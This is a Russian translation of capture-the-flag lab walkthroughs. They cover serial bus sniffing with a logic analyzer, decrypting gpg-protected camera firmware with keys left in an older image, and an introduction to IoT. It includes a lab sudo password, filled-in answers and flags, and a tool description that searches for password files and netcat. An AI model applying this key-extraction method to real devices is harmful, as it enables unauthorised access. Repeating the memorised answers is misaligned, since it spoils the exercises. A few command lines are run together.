- Бит на передачу — обычно устанавливается на 8 бит, что составляет байт, но может быть настроено на другое значение, 
  например, 16 бит.
- Стоповые и стартовые биты - Поскольку тактовый генератор отсутствует, одно устройство должно отправить сигнал 
  другому устройству, прежде чем оно сможет отправить или завершить передачу данных. Конфигурация стартовых и 
  стоповых битов определяет, как это делается. 
Биты четности. Поскольку при передаче данных могут возникать ошибки, биты четности можно использовать для 
  обнаружения и исправления таких ошибок. 
Как только два устройства согласуют конфигурацию последовательных линий, они смогут общаться друг с другом. На схеме 
  ниже показана одна передача, показывающая, как будет передаваться символ ASCII "S": 

### USART-коммуникации

Однако есть пара оговорок. Устройства на самом деле не имеют способа определить, готово ли другое устройство к 
коммуникации. Чтобы решить эту проблему, некоторые соединения USART будут использовать две дополнительные линии, 
называемые Clear To Send (CTS) и Request to Send (RTS), чтобы сообщать другому устройству, готово ли оно к приему 
или к передаче. Кроме того, чтобы согласовать, какой уровень напряжения является двоичной 1 или 0, требуется третий 
провод, называемый проводом заземления (GND), чтобы устройства имели один и тот же опорный уровень напряжения.    

Однако, несмотря на все это, USART является невероятно популярным протоколом в микропроцессорах благодаря своей простоте.

### SPI

Протокол связи последовательного периферийного интерфейса (SPI) в основном используется для связи между 
микропроцессорами и небольшими периферийными устройствами, такими как датчик или SD-карта. В то время как связь 
USART имеет встроенные в линии TX и RX часы, SPI использует отдельный провод часов. Разделение часов (SCK) от линии 
данных (DATA) позволяет осуществлять синхронную связь, которая быстрее и надежнее. Таким образом, компромисс 
заключается в добавлении дополнительного провода, но мы получаем повышение скорости и надежности. Пример того же «S»,
передаваемого с помощью SPI, показан ниже:     

SPI-коммуникации

Линия синхронизации сообщает принимающему устройству, когда именно ему нужно считать линию данных. Двусторонняя 
связь также возможна, но она немного сложнее последовательной связи. По сути, одно из устройств называется 
контроллером. Это единственное устройство, которому разрешено отправлять сигналы синхронизации. Все остальные 
устройства становятся вторичными устройствами, которые должны следовать сигналу синхронизации контроллера для 
передачи данных обратно. Если используется двусторонняя связь, вместо одной линии данных используются две линии, а 
именно Peripheral-In Controller-Out (PICO), что означает, что связь отправляется с контроллера, и Peripheral-Out 
Controller-In (POCI), что означает, что связь отправляется с вторичного устройства обратно на контроллер. Используя 
это, контроллер отправляет сигнал синхронизации и команду на устройство с помощью линии PICO, а затем, сохраняя 
сигнал синхронизации, контроллер получает данные обратно на линию POCI, как показано на схеме ниже:         

SPI множественные коммуникации

Можно сделать еще одно изменение. Хотя контроллер может быть только один, вторичных устройств может быть несколько. 
Для экономии проводов и портов все устройства могут использовать одни и те же линии SCK, PICO и POCI. Четвертый 
провод, называемый проводом выбора чипа (CS), используется для различения устройства, для которого предназначена 
связь. Контроллер может использовать эту линию, чтобы указать конкретному устройству, с которым он хочет связаться, 
как показано на схеме ниже:    

I2C-коммуникации

Связь по протоколу SPI немного сложнее, чем USART, но наличие выделенной линии синхронизации увеличивает скорость, с 
которой мы можем обмениваться данными, и повышает надежность. 

I2C

Протокол связи Inter-Integrated Circuit (I2C) был создан для устранения недостатков протоколов связи USART и SPI. 
Поскольку USART является асинхронным и имеет встроенные в линии передачи и приема часы, устройства должны заранее 
согласовывать конфигурацию связи. Кроме того, скорости снижаются, чтобы обеспечить надежность связи. С другой 
стороны, хотя SPI быстрее и надежнее, для связи требуется гораздо больше проводов, и каждое дополнительное 
периферийное устройство требует еще одного провода Chip Select.    

I2C пытается решить эти проблемы. Подобно USART, I2C использует только две линии для связи. I2C использует линию 
последовательных данных (SDA) и линию последовательного тактирования (SCL) для связи. Однако вместо использования 
провода выбора микросхемы для определения того, с каким периферийным устройством осуществляется связь, I2C 
использует сигнал адреса, который отправляется по проводу SDA. Этот адрес сообщает всем контроллерам и периферийным 
устройствам, какое устройство пытается установить связь и с каким устройством оно пытается установить связь. После 
отправки сигнала можно использовать сигнал данных для отправки фактического сообщения. Чтобы уведомить другие 
контроллеры и периферийные устройства о том, что связь осуществляется, и предотвратить общение этих устройств друг с 
другом, используются сигналы запуска и остановки. Каждое устройство может отслеживать эти сигналы запуска и 
остановки, чтобы определить, заняты ли линии связью. Пример такой передачи данных показан ниже:         

I2C-коммуникации

Поскольку используется внешняя линия синхронизации, связь все еще быстрее и надежнее, чем USART, и хотя она немного 
медленнее, чем SPI, использование сигнала адреса означает, что до 1008 устройств могут быть подключены к тем же двум 
линиям и смогут общаться. Теперь, когда мы понимаем основы протоколов аппаратной связи, мы можем проанализировать 
логику этого мошеннического импланта!     

Исследование логики

После отправки этого мошеннического имплантата в судебно-медицинскую лабораторию для анализа была обнаружена 
следующая электрическая схема: 

Схема

СхемаСудя по схеме, похоже, что есть микропроцессор, подключенный к чипу ESP32. Проведя небольшое исследование, мы 
видим, что чипы ESP32 позволяют микропроцессорам взаимодействовать через WiFi и мобильные сети. Так что, что бы ни 
делал этот имплант, он определенно общался с кем-то еще. Если мы сможем перехватить связь между микропроцессором и 
чипом ESP32, мы сможем увидеть, какие команды и информация отправляются. Кажется, это идеальная возможность для 
нашей красно-синей команды объединиться! Elf Forensic и Elf Recon взялись за дело!     

СхемаЭльфы понимают, что эти чипы, вероятно, используют цифровую связь, которую можно перехватить с помощью 
логического анализатора. Рассматривая провода между чипами, мы видим черный провод, подключенный к контакту под 
названием GND, и красный провод, подключенный к контакту под названием VIN. Elf Forensic знает по опыту, что это 
будут провода Ground и Voltage IN соответственно, то есть эти провода используются для подачи питания на чип. Тогда 
остаются зеленый и фиолетовый провода, которые будут использоваться для передачи данных. Видя, что они подключены к 
контактам RX0 и TX0, Elf Recon может сделать вывод, что это относится к линиям передачи и приема связи USART. 
Следовательно, мы почти уверены, что протокол, используемый для связи, — USART. Вооружившись этой информацией, эльфы 
подключают зонды логического анализатора к зеленому и фиолетовому проводам перед включением имплантата. На 
анализаторе немедленно появляются сверхбыстрые сигналы! Эльфы создают логический дамп данных из сигналов, и МакСкиди 
просит вас расследовать, что на самом деле передается!          

Анализ логики

Для анализа логического дампа данных нам понадобится инструмент логического анализатора под названием Saleae. 
Запустите машину, подключенную к этой задаче (если вы еще этого не сделали), которая откроет машину Windows в 
браузере, где все необходимые инструменты уже установлены для вас. После загрузки машины на рабочий стол дважды 
щелкните приложение Logic 2. После загрузки вы должны увидеть этот экран:     

 

Давайте импортируем дамп логических данных, чтобы запустить наш анализатор. Выберите опцию Open a Capture, выберите 
santaфайл, который находится на рабочем столе, и нажмите Open: 
Логические данные

Вы можете игнорировать всплывающее окно с ошибкой калибровки. После загрузки вы должны увидеть снимки. Если вы 
удерживаете левый Ctrl и используете колесико мыши, чтобы немного уменьшить масштаб (или вы можете нажать View->X 
Zoom Out), вы должны увидеть цифровые сигналы:  

 

D0 и D1 относятся к цифровым каналам двух линий, которые были проверены. A0 и A1 относятся к аналоговым данным от 
зондов. Наведите указатель мыши на первую толстую линию на канале D1 1 и используйте левый Ctrl и колесико мыши, 
чтобы снова увеличить масштаб; вы должны увидеть всю передачу сигнала:  

 

Что очень интересно на этом экране, так это то, что вы можете видеть, как аналоговые данные напряжения соответствуют 
цифровому сигналу, который вы видите. Глядя на A1 Channel 1 против D1 Channel 1, вы можете увидеть, что есть 
небольшие разрывы в аналоговых данных, которые были исправлены в цифровом канале. Теперь, когда мы можем видеть 
данные цифрового сигнала, мы можем использовать логический анализатор для считывания содержимого данных. Щелкните 
вкладку Analyzers справа:    

 

Поскольку мы знаем, что протокол — USART, давайте попробуем настроить анализатор Async Serial для каналов 1 и 0. 
Сначала настроим анализатор канала 1. Если бы мы были настоящими специалистами по обратному проектированию 
оборудования, нам бы сначала пришлось выяснить скорость передачи данных, а также конкретную конфигурацию, такую 
как биты четности и кадры. Однако, чтобы не усложнять задачу, Forensic Elf уже обнаружил это для вас. Измените 
свою конфигурацию так, чтобы она соответствовала следующему, и нажмите «Сохранить»:    

 

После сохранения мы видим, что данные анализируются. Щелкните по маленькому значку терминала, и мы сможем прочитать 
передаваемые данные! 

 

Мы видим последовательность инициализации последовательной линии, а затем три отправляемые строки данных:

ПЕРЕЗАГРУЗКА ACK
CMDX195837
9600
Это пока ничего не значит, так как мы видим только одну сторону данных. Чтобы увидеть другие сообщения, нам нужно 
добавить еще один анализатор к каналу 0. Щелкните значок плюса рядом с Analysers и добавьте еще один анализатор 
Async Serial с той же конфигурацией, за исключением канала 0:  

 

После добавления нажмите на значок корзины в правом нижнем углу, чтобы удалить все данные терминала. После этого 
нажмите на три точки рядом с каждым анализатором и выберите «Перезапустить» на обоих. Теперь ваш терминал должен 
выглядеть примерно так:  
 

Теперь мы начинаем собирать информацию! Похоже, что микропроцессор устанавливает сеанс с устройством ESP32, чтобы 
разрешить связь с сервером управления! Теперь мы можем видеть полное обсуждение между двумя устройствами. Процессор 
просит ESP32 перезагрузить его соединение с сервером управления. ESP32 с радостью соглашается, но запрашивает 
отправку кода безопасности, чтобы разрешить соединение с сервером управления. После передачи кода безопасности ESP32 
позволяет микропроцессору согласовать новую скорость передачи данных для использования при связи. Интересно, что 
после того, как эта новая скорость передачи данных принята, мы не можем прочитать остальную часть вывода! Однако, 
поскольку мы перехватили скорость передачи данных, мы можем просто изменить наш анализатор канала 0 на новую 
скорость передачи данных, чтобы прочитать остальную часть отправленного сообщения. Сделайте это изменение, чтобы 
получить свой флаг!         

Это отличный прогресс! Мы смогли прочитать начальную коммуникацию между этими двумя устройствами, которые 
использовались для установления соединения с сервером управления. Теперь, когда у нас есть эта информация, мы можем 
продолжать контролировать линии и анализировать логику, чтобы видеть любые отправляемые сообщения. Мы на один шаг 
ближе к тому, чтобы узнать, кто несет ответственность за этот мошеннический имплант!    

### Ответить на вопросы ниже
Какое устройство можно использовать для проверки сигналов, передаваемых по электрическим проводам между двумя 
устройствами? 
```commandline
Logic Analyser
```
USART быстрее, чем SPI для связи? (Да, нет)
```commandline
Nay
```
Связь USART использует меньше проводов, чем SPI? (Да, нет)
```commandline
Yea
```
USART быстрее, чем I2C для связи? (Да, нет)
```commandline
Nay
```
I2C использует больше проводов для связи, чем SPI? (Да, нет)
```commandline
Nay
```
SPI быстрее, чем I2C для связи? (Да, нет)
```commandline
Yea
```
Какое максимальное количество устройств можно подключить к одной паре линий I2C?
```commandline
1008
```
Какова новая скорость передачи данных, согласованная между микропроцессором и чипом ESP32?
```commandline
9600
```
Какой флаг передается после принятия новой скорости передачи данных?
```commandline
THM{Hacking.Hardware.Is.Fun}
```
Хотите бросить вызов? Попробуйте наш модуль  «Недавние угрозы» !
```commandline
Ответ не нужен
```

## Задание 25
Посмотрите  видео-обучение Сакиба на 20-й день  здесь !

Теперь мы можем узнать больше о таинственном устройстве, найденном в мастерской Санты. Elf Forensic McBlue успешно удалось найти device ID. Теперь, когда у нас есть оборудование device ID, помогите Elf McSkidy обратить зашифрованную прошивку и найти интересные конечные точки для эксплуатации IoT .

Цели обучения
Что такое обратная разработка прошивки?
Методы извлечения кода из прошивки
Извлечение скрытых ключей из зашифрованной прошивки
Изменение и пересборка прошивки
Что такое обратная разработка прошивки?
Каждая встроенная система, например, камеры, маршрутизаторы, смарт-часы и т. д., имеет предустановленную прошивку, которая имеет свой собственный набор инструкций, работающих на процессоре оборудования. Она позволяет оборудованию взаимодействовать с другим программным обеспечением, работающим на устройстве . Прошивка обеспечивает низкоуровневый контроль для дизайнера/разработчика, чтобы вносить изменения на корневом уровне. 
Обратный инжиниринг — это работа в обратном направлении по коду, чтобы выяснить, как он был создан и что он делает. Обратный инжиниринг прошивки — это извлечение исходного кода из двоичного файла прошивки и проверка того, что код не выполняет никаких вредоносных или непреднамеренных функций, таких как нежелательные сетевые коммуникационные вызовы. Обратный инжиниринг прошивки обычно выполняется из соображений безопасности, чтобы обеспечить безопасное использование устройств, которые могут иметь критические уязвимости, приводящие к возможной эксплуатации или утечке данных. Рассмотрим смарт-часы, прошивка которых запрограммирована на отправку всех входящих сообщений, электронных писем и т. д. на определенный IP-адрес без какого-либо указания пользователю.

Действия по отмене прошивки
Для проведения анализа прошивка сначала загружается с веб-сайта поставщика или извлекается из устройства.
Полученная/извлеченная прошивка, обычно двоичный файл, сначала анализируется, чтобы определить ее тип (голое железо или на базе ОС ). 
Проверяется, что прошивка либо зашифрована, либо упакована. Зашифрованную прошивку сложнее анализировать, поскольку обычно требуется хитрый обходной путь, такой как откат предыдущих незашифрованных выпусков прошивки или выполнение аппаратных атак, таких как  атаки по сторонним каналам ( SCA ), для извлечения ключей шифрования. 
После расшифровки зашифрованной прошивки для выполнения обратного проектирования используются различные методы и инструменты в зависимости от ее типа.
Типы анализа прошивки
Анализ прошивки выполняется двумя методами: статическим и динамическим.
Статический анализ
Статический анализ включает в себя существенное изучение содержимого двоичного файла, выполнение его обратного проектирования и чтение инструкций по сборке для понимания функциональности. Это делается с помощью нескольких часто используемых утилит командной строки и инструментов бинарного анализа, таких как:
BinWalk :  Инструмент для извлечения прошивки, который извлекает фрагменты кода из любого двоичного файла, выполняя поиск сигнатур по многим стандартным форматам двоичных файлов, напримерzip, tar, exe, ELF, и т. д. Binwalk имеет базу данных сигнатур двоичных заголовков, по которым выполняется сопоставление сигнатур. Общей целью использования этого инструмента является извлечение файловой системы, напримерSquashfs, yaffs2, Cramfs, ext*fs, jffs2,и т. д., которая встроена в двоичный файл прошивки. Файловая система содержит весь код приложения, который будет запущен на устройстве.
Firmware ModKit (FMK) : FMK широко используется для обратного проектирования прошивок. Он извлекает прошивку с помощью binwalkи выводит каталог с файловой системой прошивки. После извлечения кода разработчик может изменить нужные  файлы и перепаковать двоичный файл одной командой. 
FirmWalker : ищет в извлеченной файловой системе прошивки уникальные строки и каталоги, такие как etc/shadow,etc/passwd, etc/ssl, специальные ключевые слова, такие как admin, root, passwordи т. д., уязвимые двоичные файлы, такие как ssh, telnet, netcat и т. д.
Динамический анализ
Динамический анализ прошивки включает запуск кода прошивки на реальном оборудовании и наблюдение за его поведением посредством эмуляции и отладки на основе оборудования/программного обеспечения. Одним из существенных преимуществ динамического анализа является анализ непреднамеренного сетевого взаимодействия для выявления хищения данных. Для динамического анализа также обычно используются следующие инструменты:
Qemu : Qemu — это бесплатный эмулятор с открытым исходным кодом, позволяющий работать в кроссплатформенных средах. Инструмент предоставляет различные способы эмуляции бинарных прошивок для различных архитектур, таких как Advanced RISC Machines (ARM), Microprocessors without Interlocked Pipelined Stages (MIPS) и т. д., на хост-системе. Qemu может помочь в эмуляции всей системы или в одиночной бинарной эмуляции файлов ELF (Executable and Linkable Format)  для системы Linux и многих других платформ.
Gnu DeBugger (GDB) : GDB — это динамический отладочный инструмент для эмуляции двоичного файла и проверки его памяти и регистров. GDB также поддерживает удаленную отладку, обычно используемую во время реверсирования прошивки, когда целевой двоичный файл работает на отдельном хосте, а реверсирование выполняется с другого хоста.
Давайте сделаем обратную прошивку!
Запустите виртуальную машину, нажав Start Machine в правом верхнем углу этой задачи. Машина загрузится в режиме разделенного экрана. Если этого не произошло, нажмите кнопку, Show Split View чтобы просмотреть машину. Подождите 1-2 минуты, пока машина полностью не загрузится. Если вы обновите страницу веб-браузера, она будет выглядеть так, как будто целевая машина перезагрузилась (так как она показывает вывод терминала по умолчанию, который отображается после загрузки). На самом деле состояние машины остается прежним, и ваш прогресс не теряется. При отмене прошивки используйте пароль, Santa1010 если будет запрошен пароль sudo . 

После определения идентификатора устройства МакСкиди извлекла зашифрованную прошивку из устройства. Чтобы провести обратную разработку, ей сначала нужна незашифрованная версия прошивки — к счастью, она нашла ее в сети. Откройте терминал и выполните команду dir. Вы увидите следующие каталоги:
Терминал
ubuntu@machine$ dir
bin  firmware-mod-kit  bin-unsigned
В binпапке содержится двоичный файл прошивки, а в firmware-mod-kitпапке — скрипт для извлечения и модификации прошивки.
В этом упражнении мы в основном будем использовать два инструмента:
Binwalk : Для проверки шифрования, а также может использоваться для расшифровки прошивки (Использование binwalk -E -N :)
Firmware Mod Kit (FMK) : Библиотека для извлечения и модификации прошивки (Использование extract-firmware.sh :)
Теперь перейдем к задаче: мы выполним реверсирование шаг за шагом.

Шаг 1: Проверка шифрования
На этом шаге Макскиди проверит, зашифрованли  двоичный файл  с помощью анализа энтропии файла . Сначала измените каталог на папку, введя команду. Затем она воспользуется инструментом для проверки шифрования с помощью командыfirmwarev2.2-encrypted.gpgbincd binbinwalkbinwalk -E -N firmwarev2.2-encrypted.gpg.

Терминал
ubuntu@machine:-/bin$ binwalk -E -N firmwarev2.2-encrypted.gpg 

DECIMAL       HEXADECIMAL     ENTROPY
--------------------------------------------------------------------------------
0             0x0             Rising entropy edge (0.988935)

В приведенном выше выводе возрастающий фронт энтропии означает, что файл, вероятно, зашифрован и имеет повышенную случайность. 

Шаг 2: Поиск незашифрованной старой версии
Поскольку последняя версия зашифрована, МакСкиди нашла более старую версию той же прошивки. Версия находится в папке bin-unsigned. Зачем она искала более старую версию? Потому что она хочет найти ключи шифрования, которые она может использовать для расшифровки оригинальной прошивки и ее обратного проектирования. МакСкиди решила использоватьFMKдля этой цели известный инструмент. Чтобы извлечь прошивку, измените каталог, введя командуcd .., а затемcd bin-unsigned. Она извлекла прошивку, выполнив следующую команду.
Терминал
ubuntu@machine:-/bin-unsigned$ extract-firmware.sh firmwarev1.0-unsigned 
Firmware Mod Kit (extract) 0.99, (c)2011-2013 Craig Heffner, Jeremy Collake

Scanning firmware...

Scan Time:     2022-11-21 17:52:44
Target File:   /home/ubuntu/bin/firmwarev1.0-unsigned
MD5 Checksum:  b141dc2678be3a20d4214b93354fedc0
Signatures:    344

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             TP-Link firmware header, firmware version: 0.-15360.3, image version: "", product ID: 0x0, product version: 138412034, kernel load address: 0x0, kernel entry point: 0x80002000, kernel offset: 4063744, kernel length: 512, rootfs offset: 849104, rootfs length: 1048576, bootloader offset: 2883584, bootloader length: 0
13344         0x3420          U-Boot version string, "U-Boot 1.1.4 (Apr  6 2016 - 11:12:23)"
13392         0x3450          CRC32 polynomial table, big endian
14704         0x3970          uImage header, header size: 64 bytes, header CRC: 0x5A946B00, created: 2016-04-06 03:12:24, image size: 35920 bytes, Data Address: 0x80010000, Entry Point: 0x80010000, data CRC: 0x510235FE, OS: Linux, CPU: MIPS, image type: Firmware Image, compression type: lzma, image name: "u-boot image"
14768         0x39B0          LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 93944 bytes
131584        0x20200         TP-Link firmware header, firmware version: 0.0.3, image version: "", product ID: 0x0, product version: 138412034, kernel load address: 0x0, kernel entry point: 0x80002000, kernel offset: 3932160, kernel length: 512, rootfs offset: 849104, rootfs length: 1048576, bootloader offset: 2883584, bootloader length: 0
132096        0x20400         LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 2494744 bytes
1180160       0x120200        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 2812026 bytes, 600 inodes, blocksize: 131072 bytes, created: 2022-11-17 11:14:32

Extracting 1180160 bytes of tp-link header image at offset 0
Extracting squashfs file system at offset 1180160
3994112
3994112
0
Extracting squashfs files...
Firmware extraction successful!
Firmware parts can be found in '/home/ubuntu/bin-unsigned/fmk/*'

Шаг 3: Поиск ключей шифрования
Оригинальная прошивка защищена gpg , что означает, что нам нужно найти открытый и закрытый ключ, а также парафраз для расшифровки изначально подписанной прошивки. Мы знаем, что незашифрованная прошивка успешно извлечена и сохранена в папке  fmk. Самый простой способ найти ключи — использовать grepкоманду. -iФлаг в команде grep игнорирует чувствительность к регистру, пока -rоператор рекурсивно ищет в текущем каталоге и подкаталогах.  

Терминал
ubuntu@machine:~bin-unsigned$ grep -ir key
Binary file firmwarev2.2-encrypted.gpg matches
Binary file firmwarev1.0-unsigned matches
Binary file fmk/image_parts/rootfs.img matches
Binary file fmk/rootfs/usr/sbin/dropbearmulti matches
Binary file fmk/rootfs/usr/sbin/dhcp6ctl matches
Binary file fmk/rootfs/usr/sbin/dhcp6c matches
Binary file fmk/rootfs/usr/sbin/xl2tpd matches
Binary file fmk/rootfs/usr/sbin/pppd matches
Binary file fmk/rootfs/usr/sbin/dhcp6s matches
Binary file fmk/rootfs/usr/bin/httpd matches
fmk/rootfs/gpg/public.key:-----BEGIN PGP PUBLIC KEY BLOCK-----
fmk/rootfs/gpg/public.key:-----END PGP PUBLIC KEY BLOCK-----
fmk/rootfs/gpg/private.key:-----BEGIN PGP PRIVATE KEY BLOCK-----
fmk/rootfs/gpg/private.key:-----END PGP PRIVATE KEY BLOCK-----


Бинго! У нас есть открытый и закрытый ключи , но как насчет парафраза,  который обычно используется с закрытым ключом для расшифровки файла, зашифрованного gpg?

Давайте найдем парафраз с помощью той же grepкоманды.

Терминал
ubuntu@machine:~bin-unsigned$ grep -ir paraphrase
fmk/rootfs/gpg/secret.txt:PARAPHRASE: [OUTPUT INTENTIONALLY HIDDEN]


МакСкиди наконец-то нашел открытый и закрытый ключи, а также парафраз.

Шаг 4: Расшифровка зашифрованной прошивки
Теперь, когда у нас есть ключи, давайте импортируем их с помощью следующей команды:

Терминал
ubuntu@machine:~bin-unsigned$ gpg --import fmk/rootfs/gpg/private.key 
gpg: key 56013838A8C14EC1: "McSkidy " not changed
gpg: key 56013838A8C14EC1: secret key imported
gpg: Total number processed: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:  secret keys unchanged: 1


При импорте закрытого ключа вам будет предложено ввести парафраз. Введите тот, который вы нашли в Шаге 3 .

Импорт открытого ключа.

Терминал
ubuntu@machine:~bin-unsigned$ gpg --import fmk/rootfs/gpg/public.key 
gpg: key 56013838A8C14EC1: "McSkidy " not changed
gpg: Total number processed: 1
gpg:              unchanged: 1


Мы можем перечислить секретные ключи.

Терминал
ubuntu@machine:~bin-unsigned$ gpg --list-secret-keys
/home/ubuntu/.gnupg/pubring.kbx
-------------------------------
sec   rsa3072 2022-11-17 [SC] [expires: 2024-11-16]
      514B4994E9B3E47A4F89507A56013838A8C14EC1
uid           [ unknown] McSkidy 
ssb   rsa3072 2022-11-17 [E] [expires: 2024-11-16]



После импорта ключей McSkidy расшифровывает прошивку с помощью  gpgкоманды. Снова смените каталог, введя команду cd .., а затем cd bin.

Терминал
ubuntu@machine:~bin$ gpg firmwarev2.2-encrypted.gpg
gpg: WARNING: no command supplied.  Trying to guess what you mean ...
gpg: encrypted with 3072-bit RSA key, ID 1A2D5BB2F7076FA8, created 2022-11-17
      "McSkidy "

После расшифровки, как только вы введете команду ls, результат расшифрованного файла будет выглядеть следующим образом:
Терминал
ubuntu@machine:~bin$ ls -lah

-rw-rw-r-- 1 test test 3.9M Dec  7 19:10 firmwarev2.2-encrypted
-rw-rw-r-- 1 test test 3.6M Dec  1 05:45 firmwarev2.2-encrypted.gpg
Шаг 5: Откат оригинальной  зашифрованной прошивки
Это самый простой шаг, и мы можем использовать binwalkили FMKдля извлечения кода из недавно расшифрованной прошивки. В этом примере мы будем использовать FMKдля извлечения кода.
Терминал
ubuntu@machine:~bin$ extract-firmware.sh firmwarev2.2-encrypted
Firmware Mod Kit (extract) 0.99, (c)2011-2013 Craig Heffner, Jeremy Collake

Scanning firmware...

Scan Time:     2022-11-21 18:05:54
Target File:   /home/ubuntu/bin/firmwarev2.2-encrypted
MD5 Checksum:  af379de1dac784b3eab78339fb203fbc
Signatures:    344

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             TP-Link firmware header, firmware version: 0.-15360.3, image version: "", product ID: 0x0, product version: 138412034, kernel load address: 0x0, kernel entry point: 0x80002000, kernel offset: 4063744, kernel length: 512, rootfs offset: 849104, rootfs length: 1048576, bootloader offset: 2883584, bootloader length: 0
13344         0x3420          U-Boot version string, "U-Boot 1.1.4 (Apr  6 2016 - 11:12:23)"
13392         0x3450          CRC32 polynomial table, big endian
14704         0x3970          uImage header, header size: 64 bytes, header CRC: 0x5A946B00, created: 2016-04-06 03:12:24, image size: 35920 bytes, Data Address: 0x80010000, Entry Point: 0x80010000, data CRC: 0x510235FE, OS: Linux, CPU: MIPS, image type: Firmware Image, compression type: lzma, image name: "u-boot image"
14768         0x39B0          LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 93944 bytes
131584        0x20200         TP-Link firmware header, firmware version: 0.0.3, image version: "", product ID: 0x0, product version: 138412034, kernel load address: 0x0, kernel entry point: 0x80002000, kernel offset: 3932160, kernel length: 512, rootfs offset: 849104, rootfs length: 1048576, bootloader offset: 2883584, bootloader length: 0
132096        0x20400         LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 2494744 bytes
1180160       0x120200        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 2776905 bytes, 596 inodes, blocksize: 131072 bytes, created: 2016-04-06 03:20:50

Extracting 1180160 bytes of tp-link header image at offset 0
Extracting squashfs file system at offset 1180160
3957248
4063744
106496
Extracting 106496 byte footer from offset 3957248
Extracting squashfs files...
Firmware extraction successful!
Firmware parts can be found in '/home/ubuntu/bin/fmk/*'

McSkidy наконец-то смогла полностью восстановить прошивку и извлечь необходимые файлы, которые она будет использовать для эксплуатации IoT (следующая комната). Она использовала ключи из более старой версии (1.0) для расшифровки последней версии (2.2) той же прошивки. Папка Cameraв  fmk/rootfs каталоге будет содержать все необходимые файлы, которые мы будем использовать в следующей задаче.

### Ответить на вопросы ниже
Каково значение флага после реверсирования файла firmwarev2.2-encrypted.gpg?

Примечание : флаг содержит подчеркивания. Если вы видите пробелы, подчеркивания могут не отображаться.


```commandline
THM{WE_GOT_THE_FIRMWARE_CODE}
```
Каково значение Paraphrase для двоичной прошивки v1.0_unsigned?


```commandline
Santa@2022
```
После реверсирования зашифрованной прошивки можно ли узнать номер сборки  rootfs ?


```commandline
2.6.31
```
Знаете ли вы, что у нас есть замечательное сообщество  на Discord ? Если вы присоединитесь к нам там, вы можете 
рассчитывать на приятное общение, советы и приемы по кибербезопасности, а также помощь в комнатах от наших 
модераторов и наставников. Наш администратор Discord также предлагает несколько комнат — вы можете попробовать  
легкую  или  сложную !   
```commandline
Ответ не нужен
```
## Задание 26
После исследования импланта веб-камеры с помощью обратного проектирования оборудования и прошивки вам поручено 
выявить и использовать любые известные уязвимости веб-камеры. Эльф Макскиди уверен, что вы не сможете 
скомпрометировать веб-камеру, поскольку она, похоже, обновлена, но мы выясним, нужны ли вообще готовые эксплойты, 
чтобы вернуть контроль над мастерской.   

Посмотрите видео-прохождение Alh4zr3d для 21-го дня  здесь !

### Цели обучения

- Объясните, что такое Интернет вещей, почему он важен и стоит ли нам беспокоиться об его опасности.
Понять разницу между протоколом, специфичным для IoT , и другими протоколами сетевых служб.
Понять, что такое модель публикации/подписки и как она взаимодействует с устройствами Интернета вещей .
Анализируйте и используйте поведение уязвимого устройства Интернета вещей .
Что такое Интернет вещей? 

Интернет  вещей ( IoT ) определяет категоризацию именно этого, «вещей». Устройства взаимосвязаны и в значительной 
степени зависят от коммуникации для достижения целей устройства. Примерами IoT являются термостаты, веб -  камеры и 
умные холодильники, и это лишь некоторые из них.  


Хотя формальное определение IoT может меняться в зависимости от того, кто его устанавливает, этот термин лучше всего 
использовать в качестве широкой классификации «устройства, которое отправляет и получает данные для взаимодействия с 
другими устройствами и системами».   

Если IoT определяет такую обширную категоризацию устройств с различными возможностями и целями, что делает их 
важными или оправдывает то, что мы должны их изучать? Хотя существует несколько обоснованных причин для изучения IoT 
, мы рассмотрим три возможных ответа.  

Во-первых, IoT классифицирует уникальные устройства, например, умные холодильники, которые не соответствуют другим 
категориям, таким как мобильные устройства. Устройства IoT, как правило, легкие, что означает, что функциональность 
и функции устройства ограничены только необходимыми. Из-за своей легкой природы современные функции могут быть 
упущены или упущены из виду, одной из самых беспокоящих является безопасность. Хотя мы живем в современную эпоху 
безопасности, ее все еще можно считать второстепенной, поэтому она не включена в основную функциональность.    

Во-вторых, устройства взаимосвязаны и часто не требуют человеческого взаимодействия. Подумайте об аутентификации, 
при которой человек использует пароль для безопасности; эти устройства должны быть не только разработаны для 
эффективной передачи данных, но и согласовывать безопасные средства связи, чтобы не требовалось человеческого 
взаимодействия, например, использование пароля.    

В-третьих, устройства спроектированы так, чтобы быть взаимосвязанными, поэтому если устройство a использует  
протокол x  , а устройство b использует протокол y, это представляет собой существенную проблему совместимости. Та 
же концепция может быть применена к безопасности, где устройства несовместимы, но могут вернуться к небезопасной 
связи.   

Помните, что безопасность часто считается второстепенным фактором, поэтому отсутствие гарантии того, что устройство 
может безопасно взаимодействовать с другими устройствами, может оказаться фатальной слабостью, которую игнорируют 
или считают менее важной.  

В следующем разделе мы рассмотрим, как функционируют протоколы Интернета вещей , и изучим примеры того, как 
устройства могут или не могут устранить недостатки, предложенные выше. 

### Введение в протоколы Интернета вещей

«Протокол IoT» классифицирует любой протокол, используемый устройством IoT для  связи между машинами ,  между 
машинами и шлюзами или  между машинами и облаком . Как было определено ранее, устройство IoT отправляет и получает 
данные для связи с другими устройствами и системами; с учетом этого целью протокола IoT должна быть  эффективная ,  
надежная и  безопасная передача данных.   

Мы можем разбить протоколы IoT на два типа:  протокол данных IoT или  сетевой протокол IoT . Эти типы могут быть 
обманчивы в своих названиях, поскольку оба используются для передачи данных. Они различаются тем, как и где 
происходит связь. На первый взгляд, протокол данных IoT обычно опирается на  модель TCP /IP  ( протокол управления 
передачей  / протокол Интернета ) , а сетевой протокол IoT  опирается на беспроводную технологию для связи. Мы 
продолжим расширять назначение этих типов протоколов ниже .     

Давайте разберем протокол данных IoT на более знакомые нам концепции. Протокол данных IoT похож на обычные сетевые 
сервисы, которые вы можете использовать или с которыми вы взаимодействуете ежедневно, такие как HTTP , SMB, FTP и 
другие. Фактически, HTTP может использоваться в качестве основы для других протоколов IoT или как сам протокол 
данных IoT .    

